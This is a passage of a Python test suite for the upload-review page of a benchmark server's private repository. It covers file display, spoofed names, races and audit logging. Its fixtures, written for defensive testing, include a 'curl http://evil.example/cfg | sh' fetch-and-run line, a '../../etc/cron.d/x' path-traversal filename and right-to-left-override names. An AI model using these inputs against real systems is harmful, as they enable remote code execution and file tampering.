        part = page.split('<h3>Scripts and definition files</h3>')[1]
        self.assertLess(part.index('install-run'), min(part.index('pre-run'), part.index('post-run')))
        self.assertLess(max(part.index('pre-run'), part.index('post-run')), part.index('helper-zzz'))
        self.assertLess(part.index('helper-zzz'), part.index('just notes'))

    def test_other_text_files_are_shown_not_hidden_behind_a_text_label(self):
        z = script_zip(b'#!/bin/sh\n. ./settings.cfg\nmake\n', extra=[('settings.cfg', 'RUN="curl http://evil.example/cfg | sh"\n'), ('Makefile', 'all:\n\techo build\n'),
                                                                  ('fix.patch', '--- a\n+++ b\n+evil\n'), ('notes', 'extension-less text\n'), ('tool.php', '<?php echo "php-script";')])
        sid, page = self.review(z)
        for needle in ('RUN=&quot;curl http://evil.example/cfg | sh&quot;', 'echo build', '+evil', 'extension-less text', 'php-script'):
            self.assertIn(needle, page, needle)
        self.assertEqual(page.count('shown below'), len(re.findall(r'<td class="pr-wrap">[^<]*</td><td>[^<]*</td><td class="pr-wrap"><code>[0-9a-f]*</code></td><td>shown below</td>', page)))
        self.assertIn('<details><summary>settings.cfg', page)
        self.assertNotIn('NOT SHOWN', page)

    def test_binary_files_need_the_second_checkbox_enforced_server_side(self):
        b = self.admin
        name = uniq('bin')
        z = script_zip(b'#!/bin/sh\necho ok\n', extra=[('payload.bin', b'\x7fELF\0\0\0\x01binary'), ('big.txt', ''.join('line %d\n' % i for i in range(40000)))])
        sid = stage_id(stage(b, z, filename=name + '.zip')[1])
        page = b.get(PAGE + '/review&id=' + sid)[2]
        self.assertIn('2 file(s) cannot be reviewed here', page)
        self.assertIn('payload.bin', page)
        self.assertIn('big.txt', page)
        self.assertIn('name="accept_unreviewable"', page)
        confirm(b, sid)                                                  # reviewed, but not the second box
        self.assertIn('second box', flash_of(b, PAGE + '/review&id=' + sid))
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertEqual(staged_dirs(), [sid])
        confirm(b, sid, extra={'accept_unreviewable': '1'})
        self.assertTrue(stored('test', name, '1.0.0'))
        d = json.loads(audit(Name=name, Action='upload_committed')[0]['Detail'])
        self.assertEqual(sorted(d['accepted_unreviewable_files']), ['big.txt', 'payload.bin'])

    def test_downloads_table_shows_the_saved_as_name_and_flags_odd_ones(self):
        dl = ('<?xml version="1.0"?><PhoronixTestSuite><Downloads>'
              '<Package><URL>https://ok.example/a.bin</URL><SHA256>' + 'cd' * 32 + '</SHA256><FileName>a.bin</FileName></Package>'
              '<Package><URL>https://ok.example/b.bin</URL><SHA256>' + 'ef' * 32 + '</SHA256><FileName>../../etc/cron.d/x</FileName></Package>'
              '</Downloads></PhoronixTestSuite>')
        sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('downloads.xml', dl)]))
        self.assertIn('Saved as', page)
        rows = re.findall(r'<tr><td class="pr-wrap">https://ok\.example.*?</tr>', page)
        self.assertEqual(len(rows), 2)
        self.assertIn('a.bin', rows[0])
        self.assertNotIn('path separator', rows[0])
        self.assertIn('../../etc/cron.d/x', rows[1])
        self.assertIn('path separator or ..', rows[1])

    def test_entry_names_and_download_urls_are_rendered_with_invisible_characters_made_visible(self):
        # F1: a name or URL must not be able to spoof how it reads (right-to-left override, zero-width characters, tabs)
        dl = ('<?xml version="1.0"?><PhoronixTestSuite><Downloads><Package><URL>http://good.example/\u202eg\u200bnp.bin</URL>'
              '<FileName>a\u202eb.bin</FileName></Package></Downloads></PhoronixTestSuite>')
        names = ['x\u202egnp.sh', 'a\u200bb.sh', 'tab\there.txt']
        sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('downloads.xml', dl)] + [(n, b'#!/bin/sh\necho x\n') for n in names]))
        for raw in ('\u202e', '\u200b', '\t'):
            self.assertNotIn(raw, page.replace('\t', ''), 'raw %r reached the page' % raw)
        files_table = page.split('<h3>Files</h3>')[1].split('</table>')[0]
        self.assertIn('x&lt;U+202E&gt;gnp.sh', files_table)
        self.assertIn('a&lt;U+200B&gt;b.sh', files_table)
        self.assertIn('tab&lt;U+0009&gt;here.txt', files_table)
        headings = ''.join(re.findall(r'<h4>.*?</h4>', page))
        self.assertIn('x&lt;U+202E&gt;gnp.sh', headings)
        dl_table = page.split('Downloads fetched at install time')[1].split('<h3>Files</h3>')[0]
        self.assertIn('http://good.example/&lt;U+202E&gt;g&lt;U+200B&gt;np.bin', dl_table)
        self.assertIn('a&lt;U+202E&gt;b.bin', dl_table)

    def test_windows_unsafe_entry_names_are_rejected_at_stage_time(self):
        # F2: what Windows would extract differently from what the review shows, or cannot extract at all
        dl = '<?xml version="1.0"?><PhoronixTestSuite><Downloads><Package><URL>http://evil.example/a.bin</URL><FileName>a.bin</FileName></Package></Downloads></PhoronixTestSuite>'
        bad = ['downloads.xml.', 'downloads.xml ', 'install.sh.', 'DOWNLO~1.XML', 'CON', 'nul.sh', 'com1.txt', 'LPT9', 'sub/aux', 'sub /x.sh', 'downloads.xml:evil', 'a:b']
        before = len(audit(Action='upload_rejected'))
        for name in bad:
            with self.subTest(name):
                z = script_zip(b'#!/bin/sh\necho ok\n', extra=[(name, dl)])
                status, headers, _ = stage(self.admin, z)
                self.assertIsNone(stage_id(headers), name)
                self.assertIn('Windows', flash_of(self.admin, UPLOAD), name)
        z = script_zip(b'#!/bin/sh\necho ok\n', extra=[('Notes.txt', b'a'), ('notes.txt', b'b')])
        self.assertIsNone(stage_id(stage(self.admin, z)[1]))
        self.assertIn('only by case', flash_of(self.admin, UPLOAD))
        self.assertEqual(staged_dirs(), [])
        self.assertEqual(len(audit(Action='upload_rejected')), before + len(bad) + 1)
        # names that merely look similar are fine
        sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('console.sh', b'#!/bin/sh\n'), ('conf/nulled.txt', b'x'), ('a.b.c', b'x'), ('v1~x.txt', b'x')]))
        self.assertIn('console.sh', page)

    def test_downloads_table_reads_the_file_the_way_the_client_does(self):
        # F3: the client ignores the root element's name and uses the first Downloads child
        dl = ('<?xml version="1.0"?><phoronixtestsuite><Downloads><Package><URL>https://ok.example/odd-root.bin</URL><FileName>odd-root.bin</FileName></Package></Downloads>'
              '<Downloads><Package><URL>https://ignored.example/second.bin</URL></Package></Downloads></phoronixtestsuite>')
        sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('downloads.xml', dl)]))
        self.assertIn('https://ok.example/odd-root.bin', page.split('<h3>Files</h3>')[0])
        self.assertNotIn('second.bin', page.split('<h3>Files</h3>')[0])
        self.assertNotIn('no download could be read', page)
        # a downloads.xml that yields no rows is called out instead of silently producing an empty section
        for label, body in (('not xml', '<Downloads><Package>'), ('no packages', '<?xml version="1.0"?><x><Other/></x>')):
            sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('downloads.xml', body)]))
            self.assertIn('no download could be read', page, label)
            self.assertNotIn('Downloads fetched at install time', page, label)

    def test_hint_scanning_is_bounded(self):
        evil = b'#!/bin/sh\n' + b'curl ' * 50000                          # 250 KB on one line: quadratic patterns would hang
        t = time.time()
        sid, page = self.review(script_zip(evil))
        self.assertLess(time.time() - t, 20)
        self.assertIn('not a verdict', page)

    def test_derived_name_is_clean_and_shown(self):
        sid = stage_id(stage(self.admin, test_zip(), filename='My Test (1).zip')[1])
        page = self.admin.get(PAGE + '/review&id=' + sid)[2]
        self.assertIn('<code>private/my-test-1-1.0.0</code>', page)


class TestRaces(UploadBase):
    def exec_race(self, funcs):
        barrier = threading.Barrier(len(funcs))

        def wrap(f):
            def go():
                barrier.wait()
                return f()
            return go
        with concurrent.futures.ThreadPoolExecutor(len(funcs)) as ex:
            return [x.result() for x in [ex.submit(wrap(f)) for f in funcs]]

    def test_cancel_and_confirm_race_has_exactly_one_winner(self):
        for rnd in range(6):
            name = uniq('cc')
            a, c = self.fresh_admin(), self.fresh_admin()
            sid = stage_id(stage(a, test_zip(), filename=name + '.zip')[1])
            sha = sha256_of_stage(sid)
            ta, tc = a.token(PAGE + '/upload'), c.token(PAGE + '/upload')
            self.exec_race([lambda: confirm(a, sid, sha=sha, token=ta),
                            lambda: c.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': tc})])
            committed = len(audit(Name=name, Action='upload_committed'))
            cancelled = len(audit(Name=name, Action='upload_cancelled'))
            self.assertEqual(committed + cancelled, 1, 'round %d: committed=%d cancelled=%d' % (rnd, committed, cancelled))
            self.assertEqual(stored('test', name, '1.0.0'), committed == 1)
            self.assertEqual(staged_dirs(), [])

    def test_two_cancels_audit_once(self):
        name = uniq('c2')
        a, c = self.fresh_admin(), self.fresh_admin()
        sid = stage_id(stage(a, test_zip(), filename=name + '.zip')[1])
        ta, tc = a.token(PAGE + '/upload'), c.token(PAGE + '/upload')
        self.exec_race([lambda: a.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': ta}), lambda: c.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': tc})])
        self.assertEqual(len(audit(Name=name, Action='upload_cancelled')), 1)

    def test_sweep_does_not_remove_a_stage_that_is_being_confirmed(self):
        name = uniq('sw')
        b = self.admin
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json && mv %s%s/upload.zip %s%s/committing.zip" % ((STAGING, sid) * 3))   # a confirm is mid-flight
        b.get(PAGE)
        self.assertEqual(staged_dirs(), [sid], 'the sweep must leave a claimed stage alone')
        self.assertEqual(audit(Name=name, Action='upload_expired'), [])
        srv_sh('mv %s%s/committing.zip %s%s/upload.zip' % (STAGING, sid, STAGING, sid))
        b.get(PAGE)
        self.assertEqual(staged_dirs(), [])
        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)

    def test_parallel_sweeps_expire_a_stage_once(self):
        name = uniq('sw2')
        sid = stage_id(stage(self.admin, test_zip(), filename=name + '.zip')[1])
        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json" % (STAGING, sid))
        browsers = [self.fresh_admin() for _ in range(8)]
        self.exec_race([(lambda x=x: x.get(PAGE)) for x in browsers])
        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)
        self.assertEqual(staged_dirs(), [])

    def test_parallel_stage_posts_cannot_exceed_the_per_user_cap(self):
        browsers = [self.fresh_admin() for _ in range(10)]
        toks = [x.token(UPLOAD) for x in browsers]
        z = test_zip()
        results = self.exec_race([(lambda i=i: stage_id(stage(browsers[i], z, token=toks[i])[1])) for i in range(10)])
        self.assertEqual(len([r for r in results if r]), 5)
        self.assertEqual(len(staged_dirs()), 5)

    def test_parallel_stage_posts_cannot_exceed_the_total_cap(self):
        users = [self.fresh_admin() for _ in range(2)] + [self.admin2() for _ in range(2)]
        toks = [x.token(UPLOAD) for x in users]
        big = test_zip(extra=[('blob.bin', random.Random(77).randbytes(int(4.5 * 1024 * 1024)))])
        results = self.exec_race([(lambda i=i: stage_id(stage(users[i], big, token=toks[i])[1])) for i in range(4)] * 2)
        total = sum(int(x) for x in (srv_sh("find %s -name upload.zip -printf '%%s\\n'" % STAGING).split() or ['0']))
        self.assertLessEqual(total, 25 * 1024 * 1024)
        self.assertLessEqual(len([r for r in results if r]), 5)


class TestStaleStateAndMisc(UploadBase):
    def test_overwrite_is_refused_when_the_existing_version_changed_since_review(self):
        b = self.admin
        name = uniq('stale')
        old = test_zip(extra=[('a.txt', 'one')])
        upload(self.msi, 'test', name, old)
        sid = stage_id(stage(b, test_zip(extra=[('a.txt', 'two')]), filename=name + '.zip')[1])
        self.assertIn('already exists', b.get(PAGE + '/review&id=' + sid)[2])
        upload(self.msi, 'test', name, test_zip(extra=[('a.txt', 'three')]), overwrite=True)      # someone changes it meanwhile
        confirm(b, sid, overwrite=True)
        self.assertIn('changed since you reviewed', flash_of(b))
        self.assertEqual(srv_sh('sha256sum %stests/%s/1.0.0.zip' % (REPO_DIR, name)).split()[0], hashlib.sha256(test_zip(extra=[('a.txt', 'three')])).hexdigest())
        self.assertEqual([r for r in audit(Name=name, Action='upload_committed') if json.loads(r['Detail']).get('source') == 'web'], [])

    def test_a_version_that_appears_after_review_is_not_silently_overwritten_or_refused_silently(self):
        b = self.admin
        name = uniq('late')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        self.assertNotIn('name="overwrite"', b.get(PAGE + '/review&id=' + sid)[2])
        upload(self.msi, 'test', name, test_zip(extra=[('x', 'y')]))
        confirm(b, sid, overwrite=True)                                   # a crafted overwrite flag for something never reviewed
        self.assertIn('changed since you reviewed', flash_of(b))
        self.assertEqual(len([r for r in audit(Name=name, Action='upload_committed')]), 1, 'only the CLI upload')

    def test_a_copied_meta_json_cannot_adopt_another_stage(self):
        b = self.admin
        s1 = stage_id(stage(b, test_zip())[1])
        s2 = stage_id(stage(b, test_zip(title='Other'))[1])
        srv_sh('cp %s%s/meta.json %s%s/meta.json' % (STAGING, s1, STAGING, s2))
        self.assertIn('not found', b.get(PAGE + '/review&id=' + s2)[2])

    def test_unparsed_bodies_are_not_reported_as_oversize(self):
        port = os.environ.get('QC_PORT2')
        if not port:
            self.skipTest('no twin server')
        b = Browser('http://127.0.0.1:%s' % port).login(USER, PASS)
        tok = b.token(UPLOAD)
        for ctype, body in (('application/json', b'{"action":"stage"}'), ('text/plain', b'hello')):
            req = urllib.request.Request(b.base + ACTION, data=body, headers={'Content-Type': ctype})
            try:
                b.opener.open(req, timeout=30)
            except urllib.error.HTTPError:
                pass
            flash = flash_of(b, UPLOAD)
            self.assertNotIn('post_max_size', flash, ctype)
            self.assertIn('nothing was changed', flash, ctype)


class TestFailClosed(UploadBase):
    def block(self, action):
        self.assertEqual(sql_exec("CREATE TRIGGER qc_up_block_%s BEFORE INSERT ON phoromatic_private_repo_audit WHEN NEW.Action='%s' BEGIN SELECT RAISE(ABORT,'qc'); END" % (action, action)), 'ok')
        self.addCleanup(sql_exec, 'DROP TRIGGER IF EXISTS qc_up_block_%s' % action)

    def test_stage_is_refused_without_an_audit_row(self):
        self.block('upload_staged')
        status, headers, _ = stage(self.admin, test_zip())
        self.assertIsNone(stage_id(headers))
        self.assertIn('audit log could not be written', flash_of(self.admin, UPLOAD))
        self.assertEqual(staged_dirs(), [])

    def test_confirm_stores_nothing_without_the_attempt_row_and_the_stage_survives(self):
        b = self.admin
        name = uniq('fc')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        self.block('upload_attempt')
        confirm(b, sid)
        self.assertIn('audit log could not be written', flash_of(b, PAGE + '/review&id=' + sid))
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertEqual(staged_dirs(), [sid], 'the stage can be retried or cancelled')
        self.assertEqual(sorted(srv_sh('ls %s%s' % (STAGING, sid)).split()), ['meta.json', 'upload.zip'])
        self.assertEqual([f for f in srv_sh('ls -a %s' % REPO_DIR).split() if f.startswith('upload-')], [])
        sql_exec('DROP TRIGGER qc_up_block_upload_attempt')
        confirm(b, sid)
        self.assertTrue(stored('test', name, '1.0.0'))

    def test_a_missing_completion_row_is_reported_after_the_fact(self):
        b = self.admin
        name = uniq('fcc')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        self.block('upload_committed')
        confirm(b, sid)
        self.assertIn('could not be written to the audit log', flash_of(b))
        self.assertTrue(stored('test', name, '1.0.0'))

    def test_expiry_needs_its_audit_row_and_the_stage_is_kept_until_it_can_be_written(self):
        # F7: an expired stage is only removed together with its upload_expired row
        b = self.admin
        name = uniq('fce')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json" % (STAGING, sid))
        self.block('upload_expired')
        b.get(PAGE)                                                    # page load sweeps
        stage(b, test_zip(), filename=uniq('fce2') + '.zip')           # so does staging another upload
        self.assertIn(sid, staged_dirs(), 'no audit row, no removal')
        self.assertEqual(sorted(srv_sh('ls %s%s' % (STAGING, sid)).split()), ['meta.json', 'upload.zip'], 'nothing left claimed')
        self.assertEqual(audit(Name=name, Action='upload_expired'), [])
        sql_exec('DROP TRIGGER qc_up_block_upload_expired')
        b.get(PAGE)
        self.assertNotIn(sid, staged_dirs())
        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)

    def test_cancel_needs_its_audit_row(self):
        b = self.admin
        sid = stage_id(stage(b, test_zip())[1])
        self.block('upload_cancelled')
        b.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': b.token()})
        self.assertIn('stays staged until it expires', flash_of(b, PAGE + '/review&id=' + sid))
        self.assertEqual(staged_dirs(), [sid])


class TestConcurrency(UploadBase):
    def test_parallel_confirms_of_one_stage_store_exactly_once(self):
        name = uniq('par')
        a = self.admin
        sid = stage_id(stage(a, test_zip(), filename=name + '.zip')[1])
        sha = sha256_of_stage(sid)
        browsers = [self.fresh_admin() for _ in range(6)]
        toks = [x.token() for x in browsers]
        barrier = threading.Barrier(6)

        def go(i):
            barrier.wait()
            return confirm(browsers[i], sid, sha=sha, overwrite=True, token=toks[i])[0]
        with concurrent.futures.ThreadPoolExecutor(6) as ex:
            list(ex.map(go, range(6)))
        self.assertEqual(len(audit(Name=name, Action='upload_committed')), 1)
        self.assertEqual(len(audit(Name=name, Action='upload_attempt')), 1)
        self.assertTrue(stored('test', name, '1.0.0'))
        self.assertEqual(staged_dirs(), [])
        self.assertEqual([f for f in srv_sh('ls -a %s' % REPO_DIR).split() if f.startswith('upload-')], [])

    def test_uploads_while_the_store_is_being_rebuilt_and_deleted(self):
        a = self.admin
        names = [uniq('cc') for _ in range(4)]
        victim = uniq('vic')
        upload(self.msi, 'test', victim, test_zip())
        sids = [stage_id(stage(a, test_zip(), filename=n + '.zip')[1]) for n in names]
        browsers = [self.fresh_admin() for _ in range(6)]
        toks = [x.token() for x in browsers]
        sha = [sha256_of_stage(s) for s in sids]

        def confirm_one(i):
            return confirm(browsers[i], sids[i], sha=sha[i], token=toks[i])[0]

        def rebuild():
            for _ in range(4):
                browsers[4].post(ACTION, {'action': 'rebuild', 'token_submit': toks[4]})

        def delete():
            browsers[5].post(ACTION, {'action': 'delete', 'kind': 'test', 'name': victim, 'version': '1.0.0', 'token_submit': toks[5]})
        with concurrent.futures.ThreadPoolExecutor(8) as ex:
            futures = [ex.submit(confirm_one, i) for i in range(4)] + [ex.submit(rebuild), ex.submit(delete)]
            [f.result() for f in futures]
        browsers[4].post(ACTION, {'action': 'rebuild', 'token_submit': toks[4]})
        index = call('private_repo_index', self.msi)['index']['tests']
        for n in names:
            self.assertTrue(stored('test', n, '1.0.0'), n)
            self.assertIn(n, index)
            self.assertEqual(len(audit(Name=n, Action='upload_committed')), 1)
        self.assertNotIn(victim, index)
        self.assertFalse(stored('test', victim, '1.0.0'))
        self.assertEqual([r for r in audit(Action='upload_failed') if r['Name'] in names], [])
        self.assertEqual([f for f in srv_sh('ls -a %s' % REPO_DIR).split() if f.startswith('upload-')], [])


class TestFatalAndMessages(UploadBase):
    def test_fatal_after_the_final_audit_row_after_confirm_says_it_was_stored(self):
        b = self.admin
        name = uniq('webfatal')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        index = srv_sh('find /var/cache/benchy /var/lib/benchy -name private.index 2>/dev/null | head -1').strip()
        self.assertTrue(index)
        srv_sh('cp %s %s.qcbak && truncate -s 80M %s' % (index, index, index))
        self.addCleanup(srv_sh, 'mv -f %s.qcbak %s' % (index, index))
        sid_cookie = [c.value for c in b.jar if c.name == 'PHPSESSID'][0]
        tok = b.token(PAGE + '/review&id=' + sid)
        driver = ('$in=json_decode(stream_get_contents(STDIN),true); $_POST=$_REQUEST=$in["post"]; $_COOKIE=array("PHPSESSID"=>$in["sid"]);'
                  '$_SERVER["REQUEST_METHOD"]="POST"; $_SERVER["REQUEST_URI"]="/?r_private_repository_action"; $_SERVER["QUERY_STRING"]="r_private_repository_action";'
                  '$_SERVER["REMOTE_ADDR"]="127.0.0.5"; $_SERVER["HTTP_HOST"]="x"; chdir("/bench/pts-core/phoromatic/public_html"); include "index.php";')
        run = subprocess.run(['docker', 'exec', '-i', SRV, 'php', '-d', 'memory_limit=40M', '-d', 'display_errors=0', '-d', 'log_errors=1', '-d', 'error_log=/dev/stderr', '-r', driver],
                             input=json.dumps({'sid': sid_cookie, 'post': {'action': 'confirm', 'stage_id': sid, 'sha256': sha256_of_stage(sid), 'reviewed': '1', 'token_submit': tok}}), capture_output=True, text=True)
        self.assertIn('Allowed memory size', run.stderr)
        self.assertTrue(stored('test', name, '1.0.0'))
        self.assertEqual([r['Action'] for r in audit(Name=name)], ['upload_staged', 'upload_attempt', 'upload_committed'])
        flash = flash_of(b, UPLOAD)
        self.assertIn('after it had been stored and recorded', flash)
        self.assertNotIn('/bench', flash)
        self.assertNotIn('Stack trace', flash)

    def test_error_summary_shows_no_paths_and_no_stack_trace(self):
        php = ('require "/bench/pts-core/objects/phoromatic/phoromatic_private_repo_web.php";'
               'echo phoromatic_private_repo_web::error_summary(array("file"=>"/var/www/x/y/phoromatic_private_repo.php","line"=>42,"message"=>'
               '"Uncaught TypeError: foo() in /bench/pts-core/a/b.php:12\\nStack trace:\\n#0 /bench/x.php(3): bar()\\n#1 {main}\\n thrown"));'
               'echo "|", phoromatic_private_repo_web::error_summary(array("file"=>"/a/b/c.php","line"=>3,"message"=>"file_get_contents(/var/lib/benchy/phoromatic/x.json): Failed to open stream"));')
        out = srv_sh("php -r '%s'" % php.replace("'", "'\\''"))
        self.assertNotIn('/', out.replace('|', ''))
        self.assertNotIn('Stack trace', out)
        self.assertNotIn('#0', out)
        self.assertIn('phoromatic_private_repo.php:42', out)
        self.assertIn('c.php:3', out)


class TestPhoneLayoutAndExport(UploadBase):
    def test_tables_scroll_on_phones_instead_of_squeezing(self):
        css = urllib.request.urlopen(BASE + '/phoromatic.css', timeout=30).read().decode()
        self.assertRegex(css, r'div\.pr-page table\.pr-table \{ min-width: 640px; \}')
        generic = re.search(r'div\.pr-page table\.pr-table th, div\.pr-page table\.pr-table td \{([^}]*)\}', css).group(1)
        self.assertNotIn('overflow-wrap', generic, 'anywhere on every cell squeezes the table')
        self.assertRegex(css, r'td\.pr-wrap[^{]*td\.pr-detail[^{]*\{ overflow-wrap: anywhere; \}')
        self.assertIn('div.pr-page .pr-scroll { overflow-x: auto', css)
        self.assertIn('var(--ph-', css[css.index('pr-page'):])
        page = self.admin.get(PAGE)[2]
        self.assertIn('class="pr-scroll"', page)

    def test_export_cap_keeps_the_newest_rows(self):
        name = 'ord-' + self.suffix
        php = ('$d=new SQLite3("/var/lib/benchy/phoromatic/phoromatic.db");$d->exec("BEGIN");$st=$d->prepare("INSERT INTO phoromatic_private_repo_audit '
               '(AccountID, EventTime, ActorType, Actor, SourceIP, Action, Kind, Name, Version, Detail) VALUES (:a, :t, \'machine\', \'qc\', \'10.9.9.5\', \'upload_rejected\', \'test\', :n, :i, \'{}\')");'
               '$st->bindValue(":a",$argv[1]);$st->bindValue(":t",date("Y-m-d H:i:s"));$st->bindValue(":n",$argv[2]);for($i=0;$i<50003;$i++){$st->bindValue(":i","1.0.".$i);$st->execute();$st->reset();}$d->exec("COMMIT");')
        subprocess.run(['docker', 'exec', SRV, 'php', '-r', php, AID, name], capture_output=True)
        body = self.admin.get(PAGE + '/audit&export=csv&name=' + name)[2]
        rows = list(csv.reader(io.StringIO(body, newline='')))
        self.assertEqual(len(rows), 1 + 1 + 50000)
        self.assertTrue(rows[1][0].startswith('# TRUNCATED: only the newest 50000 rows'))
        versions = [r[10] for r in rows[2:]]
        self.assertEqual(versions[-1], '1.0.50002', 'the newest row must be kept')
        self.assertEqual(versions[0], '1.0.3', 'only the oldest three are dropped')
        ids = [int(r[0]) for r in rows[2:]]
        self.assertEqual(ids, sorted(ids), 'still oldest first')


if __name__ == '__main__':
    unittest.main()
